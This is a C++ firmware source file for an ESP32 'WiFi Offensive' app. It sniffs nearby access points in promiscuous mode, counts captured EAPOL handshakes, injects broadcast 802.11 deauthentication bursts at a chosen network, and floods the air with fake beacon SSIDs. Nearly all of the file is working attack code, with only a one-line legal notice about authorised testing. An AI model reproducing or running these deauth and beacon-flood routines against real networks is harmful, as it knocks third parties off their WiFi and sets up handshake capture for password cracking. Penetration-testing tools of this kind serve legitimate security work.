/**
 * @file wifi_offensive_app.cpp
 * @brief WiFi Offensive Audit App – promiscuous monitor, deauth injection,
 *        and beacon spam for authorised penetration testing.
 *
 * Implements:
 *  - **Promiscuous Monitor**: captures management frames in real-time via
 *    esp_wifi_set_promiscuous(), lists discovered BSSIDs/SSIDs, and detects
 *    EAPOL handshakes (frames 1/4 and 2/4).
 *  - **Deauth Injection**: builds raw 802.11 deauthentication frames and
 *    injects them iteratively via esp_wifi_80211_tx().
 *  - **Beacon Spam**: floods up to 50 fake SSIDs using generated beacon
 *    frames; SSIDs can be loaded from `/ext/payloads/ssid_list.txt`.
 *
 * Uses the HackOSApp lifecycle so all work runs cooperatively inside the
 * Core_Task loop (on_update) without blocking.
 *
 * @warning **Legal notice**: Offensive WiFi operations against networks you
 * do not own or have explicit written authorisation to test is illegal.
 */

#include "apps/wifi_offensive_app.h"

#include <cstdio>
#include <cstring>
#include <new>

#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>

#include "apps/hackos_app.h"
#include "core/event.h"
#include "core/event_system.h"
#include "hardware/display.h"
#include "hardware/input.h"
#include "hardware/radio/frame_parser_80211.h"
#include "hardware/wireless.h"
#include "storage/vfs.h"
#include "ui/widgets.h"

static constexpr const char *TAG_WO = "WiFiOffensive";

namespace
{

// ── Tunables ──────────────────────────────────────────────────────────────────

static constexpr size_t  MAX_DISCOVERED_APS   = 16U;
static constexpr size_t  MAX_BEACON_SSIDS     = 50U;
static constexpr size_t  SSID_MAX_LEN         = 32U;
static constexpr uint8_t DEAUTH_BURST_SIZE    = 5U;
static constexpr uint8_t MAX_DEAUTH_BURSTS    = 100U;
static constexpr uint8_t BEACON_FRAMES_PER_TICK = 5U;
static constexpr size_t  AP_LABEL_BUF_LEN     = 32U;
static constexpr uint16_t DEAUTH_REASON_CLASS3 = 7U; ///< Class-3 frame from non-associated station
static constexpr uint8_t BEACON_MAC_PREFIX[4]  = {0xDEU, 0xADU, 0xBEU, 0xEFU};

// ── State machine ─────────────────────────────────────────────────────────────

enum class OffState : uint8_t
{
    MENU_MAIN,
    MONITOR,
    TARGET_LIST,
    DEAUTH_RUNNING,
    BEACON_RUNNING,
};

// ── Discovered AP entry ───────────────────────────────────────────────────────

struct DiscoveredAp
{
    uint8_t bssid[6];
    char    ssid[33];
    int8_t  rssi;
    uint8_t channel;
};

// ── Static menu labels ────────────────────────────────────────────────────────

static constexpr size_t MAIN_MENU_COUNT = 4U;
static const char *const MAIN_MENU_LABELS[MAIN_MENU_COUNT] = {
    "Monitor Mode",
    "Deauth Attack",
    "Beacon Spam",
    "Back",
};

// ── Shared promiscuous-mode counters (written from WiFi task, read from UI) ──

static volatile uint32_t g_pktsReceived   = 0U;
static volatile uint32_t g_handshakes     = 0U;

// Forward-declare the app so the static callback can reference its data.
class WiFiOffensiveApp;
static WiFiOffensiveApp *g_appInstance = nullptr;

// Forward declaration – defined after the app class.
static void storeDiscoveredAp(const hackos::radio::MgmtFrameInfo &info);

// ── Promiscuous RX callback (runs in WiFi task context) ──────────────────────

static void IRAM_ATTR promiscuousRxCb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (buf == nullptr)
    {
        return;
    }

    const auto *pkt = static_cast<const wifi_promiscuous_pkt_t *>(buf);
    const uint8_t *payload = pkt->payload;
    const size_t   len     = static_cast<size_t>(pkt->rx_ctrl.sig_len);

    ++g_pktsReceived;

    // EAPOL handshake detection on data frames
    if (type == WIFI_PKT_DATA)
    {
        if (hackos::radio::isEapolHandshake(payload, len))
        {
            ++g_handshakes;
        }
        return;
    }

    // Management frame capture – store discovered APs
    if (type == WIFI_PKT_MGMT && g_appInstance != nullptr)
    {
        using namespace hackos::radio;
        if (isMgmtFrame(payload, len))
        {
            const MgmtFrameInfo info = parseMgmtFrame(payload, len,
                                                       pkt->rx_ctrl.rssi);
            if (info.valid &&
                (info.subtype == SUBTYPE_BEACON ||
                 info.subtype == SUBTYPE_PROBE_RESP))
            {
                storeDiscoveredAp(info);
            }
        }
    }
}

// ── App class ─────────────────────────────────────────────────────────────────

class WiFiOffensiveApp final : public hackos::HackOSApp
{
public:
    WiFiOffensiveApp()
        : statusBar_(0, 0, 128, 8),
          mainMenu_(0, 20, 128, 36, 3),
          targetMenu_(0, 20, 128, 36, 3),
          state_(OffState::MENU_MAIN),
          needsRedraw_(true),
          discoveredCount_(0U),
          selectedTarget_(0U),
          deauthCount_(0U),
          pktsInjected_(0U),
          beaconIdx_(0U),
          beaconSeq_(0U),
          beaconSsidCount_(0U),
          promiscActive_(false),
          apLabels_{},
          apPtrs_{}
    {
        std::memset(discoveredAps_, 0, sizeof(discoveredAps_));
        std::memset(beaconSsids_, 0, sizeof(beaconSsids_));
    }

    // ── Discovered-AP table (accessed from promiscuous callback) ─────────

    void addDiscoveredAp(const hackos::radio::MgmtFrameInfo &info)
    {
        // Check if BSSID already known
        for (size_t i = 0U; i < discoveredCount_; ++i)
        {
            if (std::memcmp(discoveredAps_[i].bssid, info.addr3, 6U) == 0)
            {
                // Update RSSI / SSID if better
                discoveredAps_[i].rssi = info.rssi;
                if (info.ssid[0] != '\0')
                {
                    std::memcpy(discoveredAps_[i].ssid, info.ssid, 33U);
                }
                if (info.channel != 0U)
                {
                    discoveredAps_[i].channel = info.channel;
                }
                return;
            }
        }

        if (discoveredCount_ < MAX_DISCOVERED_APS)
        {
            DiscoveredAp &ap = discoveredAps_[discoveredCount_];
            std::memcpy(ap.bssid, info.addr3, 6U);
            std::memcpy(ap.ssid, info.ssid, 33U);
            ap.rssi    = info.rssi;
            ap.channel = info.channel;
            ++discoveredCount_;
        }
    }

protected:
    // ── HackOSApp lifecycle ──────────────────────────────────────────────

    void on_alloc() override
    {
        // No AppContext allocs needed; we use stack/member storage.
    }

    void on_start() override
    {
        statusBar_.setConnectivity(false, false);
        statusBar_.setBatteryLevel(100U);
        statusBar_.setTime(0U, 0U);
        mainMenu_.setItems(MAIN_MENU_LABELS, MAIN_MENU_COUNT);

        // Ensure WiFi HAL is initialised
        (void)Wireless::instance().init();

        g_appInstance = this;
        state_ = OffState::MENU_MAIN;
        needsRedraw_ = true;
        ESP_LOGI(TAG_WO, "WiFi Offensive app started");
    }

    void on_event(Event *event) override
    {
        if (event == nullptr)
        {
            return;
        }

        if (event->type != EventType::EVT_INPUT)
        {
            return;
        }

        const auto input = static_cast<InputManager::InputEvent>(event->arg0);
        handleInput(input);
    }

    void on_update() override
    {
        switch (state_)
        {
        case OffState::DEAUTH_RUNNING:
            performDeauthTick();
            break;
        case OffState::BEACON_RUNNING:
            performBeaconTick();
            break;
        case OffState::MONITOR:
            // Just redraw to update counters
            needsRedraw_ = true;
            break;
        default:
            break;
        }
    }

    void on_draw() override
    {
        if (!needsRedraw_ && !anyWidgetDirty())
        {
            return;
        }

        DisplayManager::instance().clear();
        statusBar_.draw();

        switch (state_)
        {
        case OffState::MENU_MAIN:
            drawTitle("WiFi Offensive");
            mainMenu_.draw();
            break;
        case OffState::MONITOR:
            drawMonitor();
            break;
        case OffState::TARGET_LIST:
            drawTitle("Select Target");
            if (discoveredCount_ > 0U)
            {
                targetMenu_.draw();
            }
            else
            {
                DisplayManager::instance().drawText(4, 28, "No APs captured");
            }
            break;
        case OffState::DEAUTH_RUNNING:
            drawDeauthStatus();
            break;
        case OffState::BEACON_RUNNING:
            drawBeaconStatus();
            break;
        }

        DisplayManager::instance().present();
        clearAllDirty();
        needsRedraw_ = false;
    }

    void on_free() override
    {
        stopPromiscuous();
        freeApLabels();
        g_appInstance = nullptr;
        Wireless::instance().deinit();
        ESP_LOGI(TAG_WO, "WiFi Offensive app freed");
    }

private:
    StatusBar    statusBar_;
    MenuListView mainMenu_;
    MenuListView targetMenu_;

    OffState state_;
    bool     needsRedraw_;

    // Discovered AP table (populated from promiscuous callback)
    DiscoveredAp discoveredAps_[MAX_DISCOVERED_APS];
    size_t       discoveredCount_;
    size_t       selectedTarget_;

    // Deauth state
    uint32_t deauthCount_;
    uint32_t pktsInjected_;

    // Beacon spam state
    size_t   beaconIdx_;
    uint16_t beaconSeq_;
    size_t   beaconSsidCount_;
    char     beaconSsids_[MAX_BEACON_SSIDS][SSID_MAX_LEN + 1U];

    bool promiscActive_;

    // AP label strings for the target-selection menu
    char       *apLabels_[MAX_DISCOVERED_APS];
    const char *apPtrs_[MAX_DISCOVERED_APS];

    // ── Dirty/redraw helpers ─────────────────────────────────────────────

    bool anyWidgetDirty() const
    {
        return statusBar_.isDirty() || mainMenu_.isDirty() || targetMenu_.isDirty();
    }

    void clearAllDirty()
    {
        statusBar_.clearDirty();
        mainMenu_.clearDirty();
        targetMenu_.clearDirty();
    }

    void transitionTo(OffState next)
    {
        state_ = next;
        needsRedraw_ = true;
    }

    // ── Drawing helpers ──────────────────────────────────────────────────

    void drawTitle(const char *title)
    {
        DisplayManager::instance().drawText(2, 10, title);
        DisplayManager::instance().drawLine(0, 18, 127, 18);
    }

    void drawMonitor()
    {
        drawTitle("Monitor Mode");

        char buf[32];
        std::snprintf(buf, sizeof(buf), "APs: %u",
                      static_cast<unsigned>(discoveredCount_));
        DisplayManager::instance().drawText(2, 22, buf);

        std::snprintf(buf, sizeof(buf), "Pkts: %lu",
                      static_cast<unsigned long>(g_pktsReceived));
        DisplayManager::instance().drawText(2, 32, buf);

        std::snprintf(buf, sizeof(buf), "Handshakes: %lu",
                      static_cast<unsigned long>(g_handshakes));
        DisplayManager::instance().drawText(2, 42, buf);

        DisplayManager::instance().drawText(2, 54, "Press to stop");
    }

    void drawDeauthStatus()
    {
        drawTitle("Deauth Attack");

        char buf[32];
        if (selectedTarget_ < discoveredCount_)
        {
            const char *ssid = discoveredAps_[selectedTarget_].ssid;
            std::snprintf(buf, sizeof(buf), "T: %.18s",
                          ssid[0] != '\0' ? ssid : "[hidden]");
            DisplayManager::instance().drawText(2, 22, buf);
        }

        std::snprintf(buf, sizeof(buf), "Injected: %lu",
                      static_cast<unsigned long>(pktsInjected_));
        DisplayManager::instance().drawText(2, 32, buf);

        std::snprintf(buf, sizeof(buf), "Handshakes: %lu",
                      static_cast<unsigned long>(g_handshakes));
        DisplayManager::instance().drawText(2, 42, buf);

        DisplayManager::instance().drawText(2, 54, "Press to stop");
    }

    void drawBeaconStatus()
    {
        drawTitle("Beacon Spam");

        char buf[32];
        std::snprintf(buf, sizeof(buf), "SSIDs: %u",
                      static_cast<unsigned>(beaconSsidCount_));
        DisplayManager::instance().drawText(2, 22, buf);

        std::snprintf(buf, sizeof(buf), "Injected: %lu",
                      static_cast<unsigned long>(pktsInjected_));
        DisplayManager::instance().drawText(2, 32, buf);

        std::snprintf(buf, sizeof(buf), "Handshakes: %lu",
                      static_cast<unsigned long>(g_handshakes));
        DisplayManager::instance().drawText(2, 42, buf);

        DisplayManager::instance().drawText(2, 54, "Press to stop");
    }

    // ── Input handling ───────────────────────────────────────────────────

    void handleInput(InputManager::InputEvent input)
    {
        switch (state_)
        {
        case OffState::MENU_MAIN:
            handleMainInput(input);
            break;
        case OffState::MONITOR:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                stopPromiscuous();
                transitionTo(OffState::MENU_MAIN);
            }
            break;
        case OffState::TARGET_LIST:
            handleTargetInput(input);
            break;
        case OffState::DEAUTH_RUNNING:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                stopPromiscuous();
                transitionTo(OffState::MENU_MAIN);
            }
            break;
        case OffState::BEACON_RUNNING:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                stopPromiscuous();
                transitionTo(OffState::MENU_MAIN);
            }
            break;
        }
    }

    void handleMainInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::UP)
        {
            mainMenu_.moveSelection(-1);
        }
        else if (input == InputManager::InputEvent::DOWN)
        {
            mainMenu_.moveSelection(1);
        }
        else if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            switch (mainMenu_.selectedIndex())
            {
            case 0U: // Monitor Mode
                startMonitor();
                break;
            case 1U: // Deauth Attack
                prepareTargetList();
                break;
            case 2U: // Beacon Spam
                startBeaconSpam();
                break;
            case 3U: // Back
            {
                const Event evt{EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK, 0, nullptr};
                EventSystem::instance().postEvent(evt);
                break;
            }
            default:
                break;
            }
        }
    }

    void handleTargetInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::UP)
        {
            targetMenu_.moveSelection(-1);
        }
        else if (input == InputManager::InputEvent::DOWN)
        {
            targetMenu_.moveSelection(1);
        }
        else if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            selectedTarget_ = targetMenu_.selectedIndex();
            startDeauth();
        }
        else if (input == InputManager::InputEvent::LEFT)
        {
            freeApLabels();
            transitionTo(OffState::MENU_MAIN);
        }
    }

    // ── Promiscuous mode control ─────────────────────────────────────────

    void startPromiscuous()
    {
        if (promiscActive_)
        {
            return;
        }

        g_pktsReceived = 0U;
        g_handshakes   = 0U;

        wifi_promiscuous_filter_t filter = {};
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                             WIFI_PROMIS_FILTER_MASK_DATA;

        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(&promiscuousRxCb);

        if (esp_wifi_set_promiscuous(true) == ESP_OK)
        {
            promiscActive_ = true;
            statusBar_.setConnectivity(false, true);
            ESP_LOGI(TAG_WO, "Promiscuous mode enabled");
        }
    }

    void stopPromiscuous()
    {
        if (!promiscActive_)
        {
            return;
        }

        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        promiscActive_ = false;
        statusBar_.setConnectivity(false, false);
        ESP_LOGI(TAG_WO, "Promiscuous mode disabled");
    }

    // ── Monitor mode ─────────────────────────────────────────────────────

    void startMonitor()
    {
        discoveredCount_ = 0U;
        std::memset(discoveredAps_, 0, sizeof(discoveredAps_));
        startPromiscuous();
        transitionTo(OffState::MONITOR);
    }

    // ── Deauth attack ────────────────────────────────────────────────────

    void prepareTargetList()
    {
        if (discoveredCount_ == 0U)
        {
            // No APs captured yet – start a quick monitor first
            startMonitor();
            return;
        }

        buildApLabels();
        targetMenu_.setItems(apPtrs_, discoveredCount_);
        transitionTo(OffState::TARGET_LIST);
    }

    void startDeauth()
    {
        deauthCount_  = 0U;
        pktsInjected_ = 0U;

        // Enable promiscuous to keep receiving EAPOL during deauth
        startPromiscuous();
        transitionTo(OffState::DEAUTH_RUNNING);
        ESP_LOGI(TAG_WO, "Deauth started on target %u", static_cast<unsigned>(selectedTarget_));
    }

    void performDeauthTick()
    {
        if (deauthCount_ >= MAX_DEAUTH_BURSTS ||
            selectedTarget_ >= discoveredCount_)
        {
            stopPromiscuous();
            transitionTo(OffState::MENU_MAIN);
            return;
        }

        const DiscoveredAp &ap = discoveredAps_[selectedTarget_];

        // Set channel to match target AP
        (void)esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

        static constexpr uint8_t BROADCAST[6] = {
            0xFFU, 0xFFU, 0xFFU, 0xFFU, 0xFFU, 0xFFU
        };

        uint8_t frame[hackos::radio::DEAUTH_FRAME_LEN];
        const size_t frameLen = hackos::radio::buildDeauthFrame(
            frame, ap.bssid, BROADCAST, DEAUTH_REASON_CLASS3);

        if (frameLen > 0U)
        {
            for (uint8_t i = 0U; i < DEAUTH_BURST_SIZE; ++i)
            {
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, frameLen, false) == ESP_OK)
                {
                    ++pktsInjected_;
                }
            }
        }

        ++deauthCount_;
        needsRedraw_ = true;
    }

    // ── Beacon spam ──────────────────────────────────────────────────────

    void startBeaconSpam()
    {
        loadBeaconSsids();
        if (beaconSsidCount_ == 0U)
        {
            generateDefaultSsids();
        }

        pktsInjected_ = 0U;
        beaconIdx_    = 0U;
        beaconSeq_    = 0U;

        startPromiscuous();

        // Set a fixed channel for beacon broadcast
        (void)esp_wifi_set_channel(1U, WIFI_SECOND_CHAN_NONE);

        transitionTo(OffState::BEACON_RUNNING);
        ESP_LOGI(TAG_WO, "Beacon spam started with %u SSIDs",
                 static_cast<unsigned>(beaconSsidCount_));
    }

    void performBeaconTick()
    {
        if (beaconSsidCount_ == 0U)
        {
            transitionTo(OffState::MENU_MAIN);
            return;
        }

        // Generate a pseudo-random MAC base for each SSID
        uint8_t srcMac[6];
        std::memcpy(srcMac, BEACON_MAC_PREFIX, 4U);

        uint8_t frame[128];

        for (uint8_t burst = 0U; burst < BEACON_FRAMES_PER_TICK; ++burst)
        {
            srcMac[4] = static_cast<uint8_t>((beaconIdx_ >> 8U) & 0xFFU);
            srcMac[5] = static_cast<uint8_t>(beaconIdx_ & 0xFFU);

            const size_t frameLen = hackos::radio::buildBeaconFrame(
                frame, sizeof(frame),
                beaconSsids_[beaconIdx_],
                srcMac, 1U, beaconSeq_);

            if (frameLen > 0U)
            {
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, frameLen, false) == ESP_OK)
                {
                    ++pktsInjected_;
                }
            }

            ++beaconSeq_;
            beaconIdx_ = (beaconIdx_ + 1U) % beaconSsidCount_;
        }

        needsRedraw_ = true;
    }

    /// @brief Try to load SSIDs from /ext/payloads/ssid_list.txt via VFS.
    void loadBeaconSsids()
    {
        beaconSsidCount_ = 0U;

        auto &vfs = hackos::storage::VirtualFS::instance();
        fs::File f = vfs.open("/ext/payloads/ssid_list.txt", "r");
        if (!f)
        {
            ESP_LOGD(TAG_WO, "No ssid_list.txt found; will use defaults");
            return;
        }

        char line[SSID_MAX_LEN + 2U]; // +2 for CR/LF
        while (beaconSsidCount_ < MAX_BEACON_SSIDS && f.available())
        {
            const int bytesRead = f.readBytesUntil('\n', line, sizeof(line) - 1U);
            if (bytesRead <= 0)
            {
                break;
            }
            line[bytesRead] = '\0';

            // Strip trailing CR
            if (bytesRead > 0 && line[bytesRead - 1] == '\r')
            {
                line[bytesRead - 1] = '\0';
            }

            if (line[0] != '\0')
            {
                std::strncpy(beaconSsids_[beaconSsidCount_], line, SSID_MAX_LEN);
                beaconSsids_[beaconSsidCount_][SSID_MAX_LEN] = '\0';
                ++beaconSsidCount_;
            }
        }

        f.close();
        ESP_LOGI(TAG_WO, "Loaded %u SSIDs from SD", static_cast<unsigned>(beaconSsidCount_));
    }

    /// @brief Generate 50 default SSIDs when no file is available.
    void generateDefaultSsids()
    {
        beaconSsidCount_ = 0U;

        static const char *const PREFIXES[] = {
            "FreeWiFi_", "HackOS_", "OpenNet_", "Guest_", "Test_",
        };
        static constexpr size_t PREFIX_COUNT = sizeof(PREFIXES) / sizeof(PREFIXES[0]);

        for (size_t i = 0U; i < MAX_BEACON_SSIDS; ++i)
        {
            std::snprintf(beaconSsids_[i], SSID_MAX_LEN + 1U, "%s%02u",
                          PREFIXES[i % PREFIX_COUNT],
                          static_cast<unsigned>(i + 1U));
            ++beaconSsidCount_;
        }

        ESP_LOGI(TAG_WO, "Generated %u default SSIDs", static_cast<unsigned>(beaconSsidCount_));
    }

    // ── AP label management ──────────────────────────────────────────────

    void buildApLabels()
    {
        freeApLabels();

        for (size_t i = 0U; i < discoveredCount_; ++i)
        {
            apLabels_[i] = new (std::nothrow) char[AP_LABEL_BUF_LEN];
            if (apLabels_[i] != nullptr)
            {
                const DiscoveredAp &ap = discoveredAps_[i];
                const char *ssid = ap.ssid[0] != '\0' ? ap.ssid : "[hidden]";
                std::snprintf(apLabels_[i], AP_LABEL_BUF_LEN, "%.18s %ddBm",
                              ssid, static_cast<int>(ap.rssi));
            }
            apPtrs_[i] = apLabels_[i];
        }
    }

    void freeApLabels()
    {
        for (size_t i = 0U; i < MAX_DISCOVERED_APS; ++i)
        {
            delete[] apLabels_[i];
            apLabels_[i] = nullptr;
            apPtrs_[i]   = nullptr;
        }
    }
};

// ── Global helper called from the promiscuous callback ───────────────────────

void storeDiscoveredAp(const hackos::radio::MgmtFrameInfo &info)
{
    if (g_appInstance != nullptr)
    {
        g_appInstance->addDiscoveredAp(info);
    }
}

} // namespace

// ── Factory ──────────────────────────────────────────────────────────────────

AppBase *createWifiOffensiveApp()
{
    return new (std::nothrow) WiFiOffensiveApp();
}
